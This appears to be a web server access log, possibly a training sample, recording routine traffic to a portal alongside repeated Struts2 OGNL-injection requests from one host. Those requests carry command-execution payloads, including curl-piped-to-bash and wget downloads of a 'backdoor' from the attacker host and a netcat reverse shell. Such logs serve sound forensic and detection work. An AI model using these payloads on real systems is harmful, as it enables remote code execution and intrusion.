192.168.1.10 - - [19/Mar/2026:08:51:03 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [19/Mar/2026:08:51:17 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
10.0.0.22 - admin [19/Mar/2026:08:51:34 +0900] "POST /login.action HTTP/1.1" 302 0 "http://target-portal.com/login.action" "Mozilla/5.0 (X11; Linux x86_64)"
198.51.100.7 - - [19/Mar/2026:08:52:01 +0900] "GET /dashboard HTTP/1.1" 200 8932 "http://target-portal.com/login.action" "Mozilla/5.0 (Windows NT 10.0)"
192.168.1.10 - - [19/Mar/2026:08:52:19 +0900] "GET /assets/style.css HTTP/1.1" 200 1204 "http://target-portal.com/dashboard" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:08:52:45 +0900] "GET /assets/main.js HTTP/1.1" 200 5870 "http://target-portal.com/dashboard" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:08:53:02 +0900] "GET /api/userinfo HTTP/1.1" 401 213 "-" "PostmanRuntime/7.32.3"
10.0.0.22 - admin [19/Mar/2026:08:53:28 +0900] "GET /admin/panel HTTP/1.1" 200 11023 "http://target-portal.com/dashboard" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:08:54:00 +0900] "GET /favicon.ico HTTP/1.1" 200 318 "-" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:08:54:11 +0900] "POST /api/upload HTTP/1.1" 200 892 "http://target-portal.com/dashboard" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:08:54:33 +0900] "GET /notice/list HTTP/1.1" 200 6741 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)"
172.16.0.5 - - [19/Mar/2026:08:55:07 +0900] "GET /notice/detail?id=3 HTTP/1.1" 200 4210 "http://target-portal.com/notice/list" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:08:55:44 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "curl/7.88.1"
198.51.100.7 - - [19/Mar/2026:08:56:01 +0900] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:08:56:22 +0900] "GET /sitemap.xml HTTP/1.1" 200 743 "-" "Googlebot/2.1"
203.0.113.45 - - [19/Mar/2026:08:57:03 +0900] "POST /api/login HTTP/1.1" 403 312 "-" "python-requests/2.28.2"
10.0.0.22 - admin [19/Mar/2026:08:57:19 +0900] "GET /admin/logs HTTP/1.1" 200 29841 "http://target-portal.com/admin/panel" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:08:57:55 +0900] "GET /search?q=hello HTTP/1.1" 200 3302 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:08:58:10 +0900] "GET /user/profile HTTP/1.1" 401 213 "-" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:08:58:44 +0900] "GET /dashboard HTTP/1.1" 200 8932 "http://target-portal.com/" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:08:59:02 +0900] "GET /index.html HTTP/1.1" 304 0 "-" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:08:59:31 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "curl/7.88.1"
172.16.0.5 - - [19/Mar/2026:09:00:05 +0900] "POST /api/feedback HTTP/1.1" 201 88 "http://target-portal.com/dashboard" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:00:23 +0900] "GET /assets/logo.png HTTP/1.1" 200 14830 "http://target-portal.com/login.action" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:09:00:49 +0900] "GET /notice/detail?id=7 HTTP/1.1" 200 5012 "http://target-portal.com/notice/list" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:01:14 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "curl/7.88.1"
10.10.10.99 - - [19/Mar/2026:09:01:23 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('whoami'))}"
10.0.0.22 - admin [19/Mar/2026:09:01:44 +0900] "GET /admin/settings HTTP/1.1" 200 7423 "http://target-portal.com/admin/panel" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:02:01 +0900] "GET /search?q=board HTTP/1.1" 200 4411 "-" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:09:02:18 +0900] "POST /api/comment HTTP/1.1" 201 154 "http://target-portal.com/notice/detail?id=3" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:02:44 +0900] "GET /dashboard HTTP/1.1" 200 8932 "-" "Mozilla/5.0 (Android 11; Mobile)"
172.16.0.5 - - [19/Mar/2026:09:03:07 +0900] "GET /user/profile HTTP/1.1" 200 3271 "http://target-portal.com/dashboard" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:03:15 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('id'))}"
198.51.100.7 - - [19/Mar/2026:09:03:38 +0900] "GET /assets/style.css HTTP/1.1" 200 1204 "-" "Mozilla/5.0"
192.168.1.10 - - [19/Mar/2026:09:04:02 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:04:29 +0900] "POST /login.action HTTP/1.1" 302 0 "-" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:04:51 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
172.16.0.5 - - [19/Mar/2026:09:05:10 +0900] "GET /notice/list HTTP/1.1" 200 6741 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:05:34 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:05:49 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('cat /etc/passwd'))}"
192.168.1.10 - - [19/Mar/2026:09:06:03 +0900] "GET /dashboard HTTP/1.1" 200 8932 "-" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:06:21 +0900] "GET /api/userinfo HTTP/1.1" 200 531 "http://target-portal.com/dashboard" "Mozilla/5.0"
10.0.0.22 - admin [19/Mar/2026:09:06:44 +0900] "DELETE /admin/user?id=42 HTTP/1.1" 200 88 "http://target-portal.com/admin/panel" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:09:07:09 +0900] "GET /assets/main.js HTTP/1.1" 304 0 "-" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:07:32 +0900] "GET /search?q=ognl+injection HTTP/1.1" 200 2901 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:07:55 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('uname -a'))}"
192.168.1.10 - - [19/Mar/2026:09:08:12 +0900] "POST /api/upload HTTP/1.1" 413 203 "http://target-portal.com/dashboard" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:08:34 +0900] "GET /notice/detail?id=9 HTTP/1.1" 200 4803 "http://target-portal.com/notice/list" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:08:59 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
172.16.0.5 - - [19/Mar/2026:09:09:17 +0900] "GET /user/profile HTTP/1.1" 200 3271 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:09:44 +0900] "GET /dashboard HTTP/1.1" 401 213 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:10:02 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('ls /var/www/html'))}"
192.168.1.10 - - [19/Mar/2026:09:10:21 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:10:49 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0"
10.0.0.22 - admin [19/Mar/2026:09:11:04 +0900] "GET /admin/panel HTTP/1.1" 200 11023 "-" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:09:11:30 +0900] "POST /api/login HTTP/1.1" 200 412 "-" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:11:52 +0900] "GET /assets/logo.png HTTP/1.1" 304 0 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:12:08 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('curl http://10.10.10.99:4444/shell.sh|bash'))}"
192.168.1.10 - - [19/Mar/2026:09:12:33 +0900] "GET /dashboard HTTP/1.1" 200 8932 "-" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:13:01 +0900] "GET /search?q=struts2 HTTP/1.1" 200 3102 "-" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:13:24 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
172.16.0.5 - - [19/Mar/2026:09:13:45 +0900] "GET /notice/list HTTP/1.1" 200 6741 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:14:07 +0900] "POST /api/comment HTTP/1.1" 201 154 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:14:29 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('wget -O /tmp/bd http://10.10.10.99/backdoor'))}"
192.168.1.10 - - [19/Mar/2026:09:14:51 +0900] "GET /user/profile HTTP/1.1" 200 3271 "http://target-portal.com/dashboard" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:15:13 +0900] "GET /assets/style.css HTTP/1.1" 304 0 "-" "Mozilla/5.0"
10.0.0.22 - admin [19/Mar/2026:09:15:38 +0900] "GET /admin/logs HTTP/1.1" 200 31204 "-" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:09:16:02 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:16:25 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:16:44 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('chmod +x /tmp/bd && /tmp/bd'))}"
192.168.1.10 - - [19/Mar/2026:09:17:09 +0900] "POST /login.action HTTP/1.1" 302 0 "-" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:17:31 +0900] "GET /dashboard HTTP/1.1" 200 8932 "http://target-portal.com/login.action" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:17:55 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
172.16.0.5 - - [19/Mar/2026:09:18:14 +0900] "GET /search?q=cve-2017-5638 HTTP/1.1" 200 2744 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:18:40 +0900] "GET /notice/detail?id=2 HTTP/1.1" 200 4312 "http://target-portal.com/notice/list" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:19:03 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('nc -e /bin/bash 10.10.10.99 4444'))}"
192.168.1.10 - - [19/Mar/2026:09:19:27 +0900] "GET /assets/main.js HTTP/1.1" 304 0 "-" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:19:50 +0900] "GET /api/userinfo HTTP/1.1" 200 531 "-" "Mozilla/5.0"
10.0.0.22 - admin [19/Mar/2026:09:20:15 +0900] "GET /admin/settings HTTP/1.1" 200 7423 "-" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:09:20:38 +0900] "POST /api/feedback HTTP/1.1" 201 88 "-" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:21:01 +0900] "GET /dashboard HTTP/1.1" 200 8932 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:21:19 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('python3 -c import socket,subprocess,os'))}"
192.168.1.10 - - [19/Mar/2026:09:21:44 +0900] "GET /notice/list HTTP/1.1" 200 6741 "-" "Mozilla/5.0"
203.0.113.45 - - [19/Mar/2026:09:22:07 +0900] "GET /user/profile HTTP/1.1" 200 3271 "-" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:22:30 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
172.16.0.5 - - [19/Mar/2026:09:22:54 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0"
198.51.100.20 - - [19/Mar/2026:09:23:17 +0900] "POST /login.action HTTP/1.1" 302 0 "-" "Mozilla/5.0"
10.10.10.99 - - [19/Mar/2026:09:23:39 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('crontab -l'))}"
192.168.1.10 - - [19/Mar/2026:09:24:01 +0900] "GET /login.action HTTP/1.1" 200 4521 "-" "Mozilla/5.0"
203.0.113.55 - - [19/Mar/2026:09:24:23 +0900] "GET /dashboard HTTP/1.1" 200 8932 "-" "Mozilla/5.0"
10.0.0.22 - admin [19/Mar/2026:09:24:47 +0900] "GET /admin/panel HTTP/1.1" 200 11023 "-" "Mozilla/5.0"
172.16.0.5 - - [19/Mar/2026:09:25:10 +0900] "GET /assets/logo.png HTTP/1.1" 200 14830 "-" "Mozilla/5.0"
198.51.100.7 - - [19/Mar/2026:09:25:33 +0900] "GET /notice/detail?id=5 HTTP/1.1" 200 4601 "http://target-portal.com/notice/list" "Mozilla/5.0"
10.0.0.30 - - [19/Mar/2026:09:25:56 +0900] "GET /api/health HTTP/1.1" 200 43 "-" "kube-probe/1.26"
10.10.10.99 - - [19/Mar/2026:09:26:10 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('ps aux'))}"
192.168.1.10 - - [19/Mar/2026:09:26:35 +0900] "GET /search?q=login HTTP/1.1" 200 3102 "-" "Mozilla/5.0"
